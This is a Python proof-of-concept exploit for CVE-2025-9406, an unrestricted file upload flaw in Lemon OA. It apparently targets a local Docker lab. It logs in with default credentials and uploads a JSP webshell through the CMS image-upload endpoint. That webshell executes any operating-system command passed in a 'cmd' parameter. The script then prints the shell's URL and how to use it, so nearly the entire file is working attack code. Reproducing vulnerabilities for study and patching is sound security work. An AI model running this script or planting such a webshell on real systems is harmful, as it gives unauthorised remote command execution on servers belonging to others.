#!/usr/bin/env python3
import requests
import sys
import random
import string

class LemonUploadExploit:
    def __init__(self, target_url, username="lingo", password="1"):
        self.target_url = target_url.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        
    def login(self):
        login_url = f"{self.target_url}/lemon/j_spring_security_check"
        data = {
            "j_username": self.username,
            "j_password": self.password
        }
        resp = self.session.post(login_url, data=data, allow_redirects=True)
        if "portal" in resp.url or "index.do" in resp.url:
            print(f"[+] Login successful as {self.username}")
            return True
        print(f"[-] Login failed")
        return False
    
    def upload_file(self, filename, content, content_type="text/plain"):
        upload_url = f"{self.target_url}/lemon/cms/cms-article-uploadImage.do"
        files = {
            "upload": (filename, content, content_type)
        }
        data = {
            "CKEditorFuncNum": "1"
        }
        resp = self.session.post(upload_url, files=files, data=data)
        if resp.status_code == 200:
            import re
            match = re.search(r"r/images/([^']+)", resp.text)
            if match:
                uploaded_path = match.group(1)
                print(f"[+] File uploaded successfully: {uploaded_path}")
                return uploaded_path
        print(f"[-] Upload failed: {resp.status_code}")
        print(f"Response: {resp.text[:500]}")
        return None
    
    def verify_upload_on_disk(self, uploaded_path):
        """Verify file exists on disk by checking container"""
        import subprocess
        try:
            result = subprocess.run(
                ["docker", "exec", "cve-2025-9406-lemon-1", "test", "-f", 
                 f"/app/mossle.store/1/cms/html/r/images/{uploaded_path}"],
                capture_output=True
            )
            if result.returncode == 0:
                print(f"[+] File verified on disk: /app/mossle.store/1/cms/html/r/images/{uploaded_path}")
                return True
        except:
            pass
        return False
    
    def exploit(self):
        print(f"[*] Target: {self.target_url}")
        print(f"[*] CVE-2025-9406 - Lemon OA Unrestricted File Upload")
        print()
        
        if not self.login():
            return False
        
        random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        
        jsp_content = """<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if(cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while((line = br.readLine()) != null) {
            out.println(line + "<br>");
        }
    }
%>
<html><body>
<h3>CVE-2025-9406 PoC - Unrestricted File Upload</h3>
<form method="GET">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>
</body></html>"""
        
        print("[*] Uploading JSP webshell...")
        uploaded_path = self.upload_file(f"{random_name}.jsp", jsp_content, "application/octet-stream")
        
        if uploaded_path:
            print()
            print("[+] Exploitation successful!")
            print(f"[+] Webshell URL: {self.target_url}/lemon/cms/html/r/images/{uploaded_path}")
            print(f"[+] Usage: ?cmd=whoami")
            
            self.verify_upload_on_disk(uploaded_path)
            
            txt_content = "CVE-2025-9406 PoC - Unrestricted File Upload Vulnerability"
            print()
            print("[*] Uploading additional test file (.txt)...")
            txt_path = self.upload_file(f"{random_name}.txt", txt_content)
            if txt_path:
                self.verify_upload_on_disk(txt_path)
            
            return True
        
        return False


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url> [username] [password]")
        print(f"Example: {sys.argv[0]} http://localhost:18080")
        print(f"Default credentials: lingo / 1")
        sys.exit(1)
    
    target_url = sys.argv[1]
    username = sys.argv[2] if len(sys.argv) > 2 else "lingo"
    password = sys.argv[3] if len(sys.argv) > 3 else "1"
    
    exploit = LemonUploadExploit(target_url, username, password)
    success = exploit.exploit()
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
